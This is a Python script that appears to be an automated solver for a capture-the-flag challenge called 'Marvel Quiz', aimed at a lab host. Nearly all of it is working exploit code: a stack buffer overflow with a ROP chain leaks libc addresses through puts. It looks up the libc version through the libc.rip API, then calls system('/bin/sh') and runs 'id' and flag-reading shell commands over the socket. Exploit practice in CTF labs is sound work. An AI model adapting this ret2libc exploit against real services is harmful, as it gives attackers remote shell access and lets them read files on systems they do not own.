#!/usr/bin/env python3
import argparse
import json
import os
import re
import socket
import struct
import subprocess
import time
import urllib.error
import urllib.request

OFFSET = 72

RET = 0x401016
POP_RDI = 0x40116A
PUTS_PLT = 0x401030
MAIN = 0x40146D

GOT = {
    "puts": 0x403FC8,
    "setbuf": 0x403FD0,
    "printf": 0x403FD8,
    "fgets": 0x403FE0,
    "exit": 0x403FE8,
}

BANNER_LINE = b"====================================="
SUCCESS_MARKERS = ("uid=", "gid=", "flag{", "ctf{", "CTF{", "FLAG{", "flag.txt")
CONNECT_RETRIES = 4
CONNECT_RETRY_DELAY = 1.0


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def u64(x: bytes) -> int:
    return struct.unpack("<Q", x)[0]


def parse_int(value) -> int:
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        value = value.strip()
        if value.startswith("0x"):
            return int(value, 16)
        return int(value, 10)
    raise TypeError(f"Unsupported integer type: {type(value)}")


def get_symbol_offset(libc_path: str, symbol: str) -> int:
    out = subprocess.check_output(["readelf", "-Ws", libc_path], text=True, errors="ignore")
    regex = re.compile(
        rf"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\w+\s+{re.escape(symbol)}(?:@@|@|$)"
    )
    for line in out.splitlines():
        m = regex.match(line)
        if m:
            return int(m.group(1), 16)
    raise RuntimeError(f"Could not resolve symbol offset for {symbol} in {libc_path}")


def get_binsh_offset(libc_path: str) -> int:
    with open(libc_path, "rb") as f:
        blob = f.read()
    off = blob.find(b"/bin/sh\x00")
    if off < 0:
        raise RuntimeError(f"Could not find /bin/sh string in {libc_path}")
    return off


class Conn:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buf = bytearray()

    def recv_until(self, marker: bytes) -> bytes:
        while marker not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("Connection closed while waiting for marker")
            self.buf.extend(chunk)
        idx = self.buf.find(marker) + len(marker)
        out = bytes(self.buf[:idx])
        del self.buf[:idx]
        return out

    def send_line(self, data: bytes) -> None:
        self.sock.sendall(data + b"\n")

    def recv_available(self, total_timeout: float = 4.0, idle_timeout: float = 0.6) -> bytes:
        self.sock.setblocking(False)
        out = bytearray(self.buf)
        self.buf.clear()
        end = time.time() + total_timeout
        idle_end = time.time() + idle_timeout
        try:
            while time.time() < end:
                try:
                    chunk = self.sock.recv(4096)
                    if chunk:
                        out.extend(chunk)
                        idle_end = time.time() + idle_timeout
                    else:
                        break
                except BlockingIOError:
                    if time.time() > idle_end:
                        break
                    time.sleep(0.02)
        finally:
            self.sock.setblocking(True)
        return bytes(out)


def connect(host: str, port: int, timeout: float) -> Conn:
    last_err = None
    for _ in range(CONNECT_RETRIES):
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            return Conn(sock)
        except (ConnectionRefusedError, TimeoutError, OSError) as e:
            last_err = e
            time.sleep(CONNECT_RETRY_DELAY)
    raise RuntimeError(
        f"Could not connect to {host}:{port} after {CONNECT_RETRIES} tries. "
        "Service may be down/expired. Restart the lab and verify host:port."
    ) from last_err


def play_to_q3(conn: Conn) -> None:
    conn.recv_until(b"> ")
    conn.send_line(b"B")
    conn.recv_until(b"> ")
    conn.send_line(b"C")
    conn.recv_until(b"> ")


def leak_symbol_addr(host: str, port: int, timeout: float, name: str, got_addr: int) -> int:
    conn = connect(host, port, timeout)
    try:
        play_to_q3(conn)
        payload = b"A" * OFFSET
        payload += p64(RET)
        payload += p64(POP_RDI)
        payload += p64(got_addr)
        payload += p64(PUTS_PLT)
        payload += p64(RET)
        payload += p64(MAIN)
        conn.send_line(payload)

        conn.recv_until(b"Interesting perspective...\n")
        leak_block = conn.recv_until(BANNER_LINE)
        leak_block = leak_block[: -len(BANNER_LINE)]
        if leak_block.endswith(b"\n"):
            leak_block = leak_block[:-1]
        if leak_block == b"":
            raise RuntimeError(f"Leak for {name} was empty")
        addr = u64(leak_block[:8].ljust(8, b"\x00"))
        print(f"[+] Leak {name}: {hex(addr)}")
        return addr
    finally:
        conn.sock.close()


def query_libc_candidates(symbol_lsb: dict) -> list:
    req_data = json.dumps({"symbols": symbol_lsb}).encode()
    req = urllib.request.Request(
        "https://libc.rip/api/find",
        data=req_data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=12) as resp:
        body = resp.read().decode()
    parsed = json.loads(body)
    if not isinstance(parsed, list):
        raise RuntimeError("Unexpected response format from libc.rip")
    return parsed


def build_local_candidate(libc_path: str) -> dict:
    return {
        "id": f"local:{libc_path}",
        "source": "local",
        "puts_off": get_symbol_offset(libc_path, "puts"),
        "printf_off": get_symbol_offset(libc_path, "printf"),
        "fgets_off": get_symbol_offset(libc_path, "fgets"),
        "system_off": get_symbol_offset(libc_path, "system"),
        "binsh_off": get_binsh_offset(libc_path),
    }


def build_remote_candidate(entry: dict) -> dict:
    symbols = entry.get("symbols", {})
    return {
        "id": entry.get("id", "unknown"),
        "source": "libc.rip",
        "puts_off": parse_int(symbols["puts"]),
        "printf_off": parse_int(symbols["printf"]),
        "fgets_off": parse_int(symbols["fgets"]),
        "system_off": parse_int(symbols["system"]),
        "binsh_off": parse_int(symbols["str_bin_sh"]),
    }


def leak_triplet_addrs(host: str, port: int, timeout: float) -> dict:
    conn = connect(host, port, timeout)
    try:
        play_to_q3(conn)
        payload = b"A" * OFFSET
        payload += p64(RET) + p64(POP_RDI) + p64(GOT["puts"]) + p64(PUTS_PLT)
        payload += p64(RET) + p64(POP_RDI) + p64(GOT["printf"]) + p64(PUTS_PLT)
        payload += p64(RET) + p64(POP_RDI) + p64(GOT["fgets"]) + p64(PUTS_PLT)
        payload += p64(RET) + p64(MAIN)
        conn.send_line(payload)

        conn.recv_until(b"Interesting perspective...\n")
        leak_block = conn.recv_until(BANNER_LINE)
        leak_block = leak_block[: -len(BANNER_LINE)]
        if leak_block.endswith(b"\n"):
            leak_block = leak_block[:-1]

        lines = [line for line in leak_block.split(b"\n") if line]
        if len(lines) < 3:
            raise RuntimeError("Could not parse 3 leaks from single-run triplet")

        leaks = {
            "puts": u64(lines[0][:8].ljust(8, b"\x00")),
            "printf": u64(lines[1][:8].ljust(8, b"\x00")),
            "fgets": u64(lines[2][:8].ljust(8, b"\x00")),
        }
        print(f"[+] Leak puts:   {hex(leaks['puts'])}")
        print(f"[+] Leak printf: {hex(leaks['printf'])}")
        print(f"[+] Leak fgets:  {hex(leaks['fgets'])}")
        return leaks
    finally:
        conn.sock.close()


def run_attempt(
    host: str,
    port: int,
    timeout: float,
    puts_off: int,
    system_off: int,
    binsh_off: int,
    flag_cmd: str,
    with_ret: bool,
) -> tuple[bool, str]:
    conn = connect(host, port, timeout)
    try:
        play_to_q3(conn)

        payload1 = b"A" * OFFSET
        payload1 += p64(RET)
        payload1 += p64(POP_RDI)
        payload1 += p64(GOT["puts"])
        payload1 += p64(PUTS_PLT)
        payload1 += p64(RET)
        payload1 += p64(MAIN)
        conn.send_line(payload1)

        conn.recv_until(b"Interesting perspective...\n")
        leak_block = conn.recv_until(BANNER_LINE)
        leak_block = leak_block[: -len(BANNER_LINE)]
        if leak_block.endswith(b"\n"):
            leak_block = leak_block[:-1]
        if leak_block == b"":
            return False, "empty puts leak"

        puts_addr = u64(leak_block[:8].ljust(8, b"\x00"))
        libc_base = puts_addr - puts_off
        if libc_base & 0xFFF:
            return False, f"bad base alignment: {hex(libc_base)}"

        print(f"[+] puts@libc: {hex(puts_addr)}  base: {hex(libc_base)}")

        play_to_q3(conn)

        payload2 = b"A" * OFFSET
        if with_ret:
            payload2 += p64(RET)
        payload2 += p64(POP_RDI)
        payload2 += p64(libc_base + binsh_off)
        payload2 += p64(libc_base + system_off)
        payload2 += p64(MAIN)

        shell_cmds = b"id\n" + flag_cmd.encode() + b"\nexit\n"
        conn.sock.sendall(payload2 + b"\n" + shell_cmds)
        time.sleep(0.5)
        out = conn.recv_available(total_timeout=5.0, idle_timeout=0.8).decode(errors="ignore")
        success = any(marker in out for marker in SUCCESS_MARKERS)
        return success, out
    except (EOFError, TimeoutError, OSError) as e:
        return False, f"network/runtime error: {e}"
    finally:
        conn.sock.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Marvel Quiz auto-solver (BOF + ret2libc)")
    parser.add_argument("--host", default="labs.ctfzone.com")
    parser.add_argument("--port", type=int, default=7756)
    parser.add_argument("--timeout", type=float, default=4.0)
    parser.add_argument("--connect-retries", type=int, default=4)
    parser.add_argument("--retry-delay", type=float, default=1.0)
    parser.add_argument("--libc", default=None, help="Optional known libc.so.6 path")
    parser.add_argument("--no-auto-libc", action="store_true", help="Disable libc.rip auto matching")
    parser.add_argument("--max-candidates", type=int, default=8)
    parser.add_argument(
        "--flag-cmd",
        default="cat /home/ctf/flag.txt || cat /flag || ls -la /home/ctf",
    )
    args = parser.parse_args()

    global CONNECT_RETRIES, CONNECT_RETRY_DELAY
    CONNECT_RETRIES = max(1, args.connect_retries)
    CONNECT_RETRY_DELAY = max(0.0, args.retry_delay)

    print(f"[+] Target: {args.host}:{args.port}")

    candidates = []
    seen = set()

    if args.libc is not None:
        if not os.path.isfile(args.libc):
            raise RuntimeError(f"Libc file not found: {args.libc}")
        local = build_local_candidate(args.libc)
        candidates.append(local)
        seen.add(
            (
                local["puts_off"],
                local["printf_off"],
                local["fgets_off"],
                local["system_off"],
                local["binsh_off"],
            )
        )
        print(f"[+] Added local libc candidate: {args.libc}")

    same_run_leaks = None
    if not args.no_auto_libc:
        try:
            same_run_leaks = leak_triplet_addrs(args.host, args.port, args.timeout)
            symbol_lsb = {name: format(addr & 0xFFF, "x") for name, addr in same_run_leaks.items()}
            print(f"[+] Query libc.rip with lsb12: {symbol_lsb}")
            entries = query_libc_candidates(symbol_lsb)
            print(f"[+] libc.rip candidates: {len(entries)}")
            for entry in entries:
                try:
                    cand = build_remote_candidate(entry)
                except Exception:
                    continue
                key = (
                    cand["puts_off"],
                    cand["printf_off"],
                    cand["fgets_off"],
                    cand["system_off"],
                    cand["binsh_off"],
                )
                if key in seen:
                    continue
                seen.add(key)
                candidates.append(cand)
        except (urllib.error.URLError, TimeoutError, OSError, RuntimeError) as e:
            print(f"[-] Auto-libc lookup failed: {e}")

    if same_run_leaks is not None:
        filtered = []
        for cand in candidates:
            if "printf_off" not in cand or "fgets_off" not in cand:
                continue
            b_puts = same_run_leaks["puts"] - cand["puts_off"]
            b_printf = same_run_leaks["printf"] - cand["printf_off"]
            b_fgets = same_run_leaks["fgets"] - cand["fgets_off"]
            if b_puts == b_printf == b_fgets and (b_puts & 0xFFF) == 0:
                cand["derived_base"] = b_puts
                filtered.append(cand)
        if filtered:
            candidates = filtered
            print(f"[+] Base-consistent candidates after exact filtering: {len(candidates)}")

    if not candidates:
        raise RuntimeError(
            "No libc candidates available. If connection was refused, restart the lab and try again; "
            "otherwise provide --libc /path/to/libc.so.6."
        )

    for i, cand in enumerate(candidates[: args.max_candidates], 1):
        print(
            f"[+] Trying candidate {i}: {cand['id']} "
            f"(puts={hex(cand['puts_off'])}, system={hex(cand['system_off'])}, binsh={hex(cand['binsh_off'])})"
        )
        for with_ret in (True, False):
            ok, out = run_attempt(
                host=args.host,
                port=args.port,
                timeout=args.timeout,
                puts_off=cand["puts_off"],
                system_off=cand["system_off"],
                binsh_off=cand["binsh_off"],
                flag_cmd=args.flag_cmd,
                with_ret=with_ret,
            )
            if ok:
                print(f"[+] Success with candidate '{cand['id']}' (with_ret={with_ret})")
                print(out)
                return
            print(f"[-] Attempt failed for '{cand['id']}' (with_ret={with_ret}): {out[:160]!r}")

    raise RuntimeError("All libc candidates failed. Need exact remote libc or broader candidate search.")


if __name__ == "__main__":
    main()
